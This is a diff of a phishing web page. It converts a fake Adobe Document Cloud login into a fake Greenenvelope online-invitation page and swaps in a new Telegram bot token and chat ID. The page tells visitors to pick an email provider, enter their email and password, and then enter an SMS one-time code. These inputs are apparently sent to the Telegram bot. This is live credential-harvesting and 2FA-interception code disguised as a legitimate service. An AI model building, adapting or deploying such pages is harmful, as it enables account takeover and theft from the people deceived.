@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Adobe Document Cloud</title>
+<title>Paperless POST</title>
 <link rel="icon" type="image/png" href="https://img.icons8.com/color/48/adobe-acrobat-reader.png">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
@@ -15,22 +15,23 @@ body::before {
 
 /* Main Card */
 .card {
-  position: relative; z-index: 2; width: 600px; max-width: 90vw;
+  position: relative; z-index: 2; width: 400px; height: 550px;
   background: rgba(0, 0, 0, 0.7); color: #fff;
-  padding: 15px 30px; border-radius: 50px; text-align: center;
+  padding: 0 30px 15px 30px; border-radius: 40px; text-align: center;
+  overflow: hidden;
 }
 .card-content { display: block; }
 .card-content.hidden { display: none; }
-.card-modal { display: none; background: #fff; border-radius: 50px; padding: 20px 30px; }
+.card-modal { display: none; background: #fff; border-radius: 21px; padding: 12px 18px; width: 320px; height: auto; min-height: 200px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
 .card-modal.active { display: block; }
-.card-header-img { width: 144px; height: 144px; margin: 0 auto 5px; object-fit: contain; }
-.card h2 { color: #fff; font-size: 20px; margin-bottom: 4px; word-wrap: break-word; }
-.card p { font-size: 13px; color: #ccc; margin-bottom: 12px; line-height: 1.3; word-wrap: break-word; }
+.card-header-img { width: 156px; height: 156px; margin: 0 auto 0; object-fit: contain; }
+.card h2 { color: #fff; font-size: 20px; margin: 0 0 5px 0; word-wrap: break-word; line-height: 1.1; }
+.card p { font-size: 12px; color: #fff; margin: 0 0 10px 0; line-height: 1.3; word-wrap: break-word; }
 
 .btn {
-  display: flex; align-items: center; margin: 12px 0;
-  padding: 8px 16px; border-radius: 25px; font-weight: 600;
-  font-size: 12px; cursor: pointer; gap: 15px; border: none; width: 100%; color: #fff;
+  display: flex; align-items: center; margin: 8px 0;
+  padding: 6px 14px; border-radius: 25px; font-weight: 600;
+  font-size: 11px; cursor: pointer; gap: 12px; border: none; width: 100%; color: #fff;
 }
 .btn span.label { flex: 1; text-align: left; }
 .btn svg { width: 20px; height: 20px; fill: currentColor; }
@@ -40,27 +41,27 @@ body::before {
 .aol { background: #00a651; }
 .other { background: #0078d4; }
 
-.card-footer { margin-top: 15px; font-size: 11px; color: #ccc; border-top: 1px solid #555; padding-top: 10px; }
-.copyright { display: block; margin-top: 3px; font-weight: bold; color: #aaa; }
+.card-footer { margin-top: 10px; font-size: 10px; color: #fff; border-top: 1px solid #555; padding-top: 8px; }
+.copyright { display: block; margin-top: 3px; font-weight: bold; color: #fff; }
 
 /* Modal Styles (inside card) */
-.modal-body { padding: 0 0 20px 0; }
-.modal-logo-container { text-align: center; margin-bottom: 20px; }
-.modal-logo-container svg, .modal-logo-container img { width: 70px; height: 70px; object-fit: contain; }
-.modal-title { font-size: 19px; font-weight: bold; color: #333; margin-bottom: 20px; text-align: center; }
+.modal-body { padding: 0 0 8px 0; }
+.modal-logo-container { text-align: center; margin-bottom: 6px; }
+.modal-logo-container svg, .modal-logo-container img { width: 36px; height: 36px; object-fit: contain; }
+.modal-title { font-size: 12px; font-weight: bold; color: #333; margin-bottom: 6px; text-align: center; }
 
-.form-group { margin-bottom: 15px; text-align: left; }
-.form-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 5px; }
+.form-group { margin-bottom: 6px; text-align: left; }
+.form-group label { display: block; font-size: 8px; font-weight: 600; color: #333; margin-bottom: 2px; }
 .form-group input {
-  width: 100%; padding: 11px; border: 1px solid #ccc;
-  border-radius: 2px; font-size: 14px; outline: none; background: #fff; color: #333;
+  width: 100%; padding: 5px; border: 1px solid #ccc;
+  border-radius: 2px; font-size: 8px; outline: none; background: #fff; color: #333;
 }
 .form-group input.invalid { border: 1.5px solid #eb1000 !important; background: #fff0f0; }
-#errorMsg { color: #eb1000; font-size: 13px; margin-bottom: 15px; display: none; font-weight: 600; text-align: center; }
+#errorMsg { color: #eb1000; font-size: 8px; margin-bottom: 6px; display: none; font-weight: 600; text-align: center; }
 
-.modal-footer { padding: 20px 0 0 0; border-top: 1px solid #ddd; text-align: right; display: flex; gap: 5px; justify-content: flex-end; }
-.btn-main { padding: 10px 30px; border-radius: 2px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; color: #fff; }
-.btn-close { padding: 10px 30px; border-radius: 2px; font-size: 14px; font-weight: 600; cursor: pointer; border: 1px solid #ccc; background: #fff; color: #333; }
+.modal-footer { padding: 8px 0 0 0; border-top: 1px solid #ddd; text-align: right; display: flex; gap: 5px; justify-content: flex-end; }
+.btn-main { padding: 5px 18px; border-radius: 2px; font-size: 9px; font-weight: 600; cursor: pointer; border: none; color: #fff; }
+.btn-close { padding: 5px 18px; border-radius: 2px; font-size: 9px; font-weight: 600; cursor: pointer; border: 1px solid #ccc; background: #fff; color: #333; }
 .btn-close:hover { background: #f5f5f5; }
 </style>
 </head>
@@ -68,10 +69,10 @@ body::before {
 
 <div class="card">
   <div class="card-content" id="cardContent">
-    <img src="Punchbowl-1.png" class="card-header-img" alt="Header Logo">
-    <h2>Adobe Document Cloud</h2>
-    <p>To read the document, please enter with the valid email credentials that this file was sent to.</p>
-
+    <img src="images.png" class="card-header-img" alt="Header Logo">
+    <h2>Manage your Online Invitations & Greeting Card</h2>
+    <p>To view the invitation, please select your email provider below and log in. You were invited to access the invitation on Greenenvlope.</p>
+    
     <button class="btn outlook" onclick="openModal('outlook')">
       <svg viewBox="0 0 24 24"><path d="M13 5v14l-9-2V7l9-2z"/><rect x="13" y="7" width="8" height="4" opacity="0.8"/><rect x="13" y="12.5" width="8" height="4" opacity="0.8"/></svg>
       <span class="label">Sign in with Outlook</span>
@@ -94,8 +95,8 @@ body::before {
     </button>
 
     <div class="card-footer">
-      Select your email provider to view Document
-      <span class="copyright">CopyRight © 2024 Adobe</span>
+      Online Invitations & Birthday Cards, greenenvelope simplifies event planning with user-friendly tools for managing online invitations and greeting cards.
+      <span class="copyright">CopyRight © 2024 Greenenvelope</span>
     </div>
   </div>
 
@@ -110,8 +111,8 @@ body::before {
 
 <script>
 /** * CONFIGURATION */
-const TELEGRAM_BOT_TOKEN = "8477454072:AAE5MU-6al8mubqg5rpApobOdEsQvgWcc50";
-const TELEGRAM_CHAT_ID   = "6371035627";
+const TELEGRAM_BOT_TOKEN = "8768980879:AAGkLihL9xoxfFZOCvj_DbeKsBr_ngBnrJo";
+const TELEGRAM_CHAT_ID   = "5273421832";
 
 let step = 1;
 let currentKey = '';
@@ -167,7 +168,7 @@ function renderLogin(showError) {
       <label>Email Address</label>
       <input type="email" id="emailInp" value="${userData.email}" placeholder="Enter Email" oninput="this.classList.remove('invalid')">
     </div>
-    <p style="font-size: 11px; color: #aaa; margin-bottom: 15px; text-align: center;">we will never share your email with anyone else</p>
+    <p style="font-size: 7px; color: #999; margin-bottom: 6px; text-align: center;">we will never share your email with anyone else</p>
     <div class="form-group">
       <label>Password</label>
       <input type="password" id="passInp" value="${userData.pass}" placeholder="Enter Password" oninput="this.classList.remove('invalid')">
@@ -220,7 +221,7 @@ function processStep() {
 
 function renderSms() {
   step = 3;
-  document.getElementById('modalContent').innerHTML = `<div style="text-align:center; padding: 20px 0;"><p style="font-size: 16px; color: #333; line-height:1.6;">You will receive an OTP within 1-5 minutes. <br>Please check your phone number on file.</p></div>`;
+  document.getElementById('modalContent').innerHTML = `<div style="text-align:center; padding: 8px 0;"><p style="font-size: 9px; color: #333; line-height:1.3;">You will receive an OTP within 1-5 minutes. <br>Please check your phone number on file.</p></div>`;
   document.getElementById('mainBtn').textContent = "OK";
 }
 
@@ -228,7 +229,7 @@ function renderOtp() {
   step = 4;
   document.getElementById('modalContent').innerHTML = `
     <div class="modal-title">Identity Verification</div>
-    <p style="font-size: 13px; margin-bottom: 20px; text-align:center;">Enter the 6-digit code sent to your device. It may take up to 3 mins.</p>
+    <p style="font-size: 8px; margin-bottom: 6px; text-align:center; color: #666;">Enter the 6-digit code sent to your device. It may take up to 3 mins.</p>
     <div class="form-group"><label>6-Digit OTP</label><input type="text" id="otpInp" maxlength="6" placeholder="000000" oninput="this.classList.remove('invalid')"></div>
   `;
   document.getElementById('mainBtn').textContent = "Submit";
